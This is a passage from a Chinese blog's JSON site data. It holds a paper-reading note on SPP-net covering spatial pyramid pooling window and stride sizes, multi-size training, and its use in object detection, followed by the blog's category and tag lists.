4，2 x 2,1 x 1，怎么办呢？这里金字塔层bins即为 n x n，也就是4 x 4，2 x 2,1 x 1，我们要做的就是如何根据a和n设计一个池化层，使得a x a的输入能够得到n x n的输出。实际上这个池化层很好设计，我们称这个大小和步幅会变化的池化层为sliding window pooling。 它的大小为：windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整。数据实验如下： 当a x a为13 x 13时，要得到4 x 4的输出，池化层的大小为4，移动步幅为3； 当a x a为13 x 13时，要得到2 x 2的输出，池化层的大小为7，移动步幅为6； 当a x a为13 x 13时，要得到1 x 1的输出，池化层的大小为13，移动步幅为13； 有的小伙伴一定发现，那如果我的输入a x a变化为10 x 10呢，此时再用上面的三个池化核好像得不到固定的理想输出啊，事实上的确如此，这是训练的第二个过程要讲的，因为此过程称之为“单一尺度训练”，针对的就是某一个固定的输入尺度而言的。 ¶1x02 多尺寸训练——multi-size（以两种尺度为例） 虽然带有SPP（空间金字塔）的网络可以应用于任意尺寸，为了解决不同图像尺寸的训练问题，我们往往还是会考虑一些预设好的尺寸，而不是一些尺寸种类太多，毫无章法的输入尺寸。现在考虑这两个尺寸：180×180,224×224，此处只考虑这两个。 我们使用缩放而不是裁剪，将前述的224的区域图像变成180大小。这样，不同尺度的区域仅仅是分辨率上的不同，而不是内容和布局上的不同。 那么对于接受180输入的网络，我们实现另一个固定尺寸的网络。在论文中，conv5输出的特征图尺寸是axa=10×10。我们仍然使用windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整，实现每个金字塔池化层。这个180网络的空间金字塔层的输出的大小就和224网络的一样了。 当a x a为10 x 10时，要得到4 x 4的输出，池化层的大小为3，移动步幅为2（注意：此处根据这样的一个池化层，10 x 10的输入好像并得不到4 x 4的输出，9 x 9或者是11 x 11的倒可以得到4 x 4的）这个地方我也还不是特别清楚这个点，后面我会说出我的个人理解。 当a x a为10 x 10时，要得到2 x 2的输出，池化层的大小为5，移动步幅为5； 当a x a为10 x 10时，要得到1 x 1的输出，池化层的大小为10，移动步幅为10； 这样，这个180网络就和224网络拥有一样的参数了。换句话说，训练过程中，我们通过使用共享参数的两个固定尺寸的网络实现了不同输入尺寸的SPP-net。 为了降低从一个网络（比如224）向另一个网络（比如180）切换的开销，我们在每个网络上训练一个完整的epoch，然后在下一个完成的epoch再切换到另一个网络（权重保留）。依此往复。实验中我们发现多尺寸训练的收敛速度和单尺寸差不多。 多尺寸训练的主要目的是在保证已经充分利用现在被较好优化的固定尺寸网络实现的同时，模拟不同的输入尺寸。除了上述两个尺度的实现，我们也在每个epoch中测试了不同的s x s输入，s是从180到224之间均匀选取的。后面将在实验部分报告这些测试的结果。 注意，上面的单尺寸或多尺寸解析度只用于训练。在测试阶段，是直接对各种尺寸的图像应用SPP-net的。 ¶0x05 Spp-Net在目标检测上的应用 SPP网络，这个方法的思想在R-CNN、Fast RCNN， Faster RCNN上都起了举足轻重的作用，对于检测算法，论文中是这样做到：使用ss生成~2k个候选框，缩放图像min(w,h)=s之后提取特征，每个候选框使用一个4层的空间金字塔池化特征，网络使用的是ZF-5的SPPNet形式。之后将12800d的特征输入全连接层，SVM的输入为全连接层的输出。这个算法可以应用到多尺度的特征提取：先将图片resize到五个尺度：480，576，688，864，1200，加自己6个。然后在map window to feature map一步中，选择ROI框尺度在｛6个尺度｝中大小最接近224x224的那个尺度下的feature maps中提取对应的roi feature。这样做可以提高系统的准确率。","categories":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}],"tags":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"深度学习","slug":"深度学习","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]}],"categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数字图像处理","slug":"课程学习/数字图像处理","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"操作系统","slug":"课程学习/操作系统","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CS231N","slug":"深度学习基础知识/CS231N","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CS231N/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"},{"name":"花书","slug":"深度学习基础知识/花书","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E8%8A%B1%E4%B9%A6/"},{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/categories/%E7%AE%97%E6%B3%95/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"计算机网络","slug":"课程学习/计算机网络","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"数据库","slug":"课程学习/数据库","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数字图像处理","slug":"数字图像处理","permalink":"http://blog.keter.top/tags/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"操作系统","slug":"操作系统","permalink":"http://blog.keter.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Gnuplot","slug":"Gnuplot","permalink":"http://blog.keter.top/tags/Gnuplot/"},{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"C3231N","slug":"C3231N","permalink":"http://blog.keter.top/tags/C3231N/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"},{"name":"工具箱","slug":"工具箱","permalink":"http://blog.keter.top/tags/%E5%B7%A5%E5%85%B7%E7%AE%B1/"},{"name":"花书","slug":"花书","permalink":"http://blog.keter.top/tags/%E8%8A%B1%E4%B9%A6/"},{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"},{"name":"神经对抗攻击","slug":"神经对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"},{"name":"小综述","slug":"小综述","permalink":"http://blog.keter.top/tags/%E5%B0%8F%E7%BB%BC%E8%BF%B0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"前后端","slug":"前后端","permalink":"http://blog.keter.top/tags/%E5%89%8D%E5%90%8E%E7%AB%AF/"},{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"算法","slug":"算法","permalink":"http://blog.keter.top/tags/%E7%AE%97%E6%B3%95/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://blog.keter.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"mist","slug":"mist","permalink":"http://blog.keter.top/tags/mist/"},{"name":"pandoc","slug":"pandoc","permalink":"http://blog.keter.top/tags/pandoc/"},{"name":"数据库","slug":"数据库","permalink":"http://blog.keter.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"English","slug":"English","permalink":"http://blog.keter.top/tags/English/"},{"name":"实例分割","slug":"实例分割","permalink":"http://blog.keter.top/tags/%E5%AE%9E%E4%BE%8B%E5%88%86%E5%89%B2/"},{"name":"深度学习","slug":"深度学习","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]}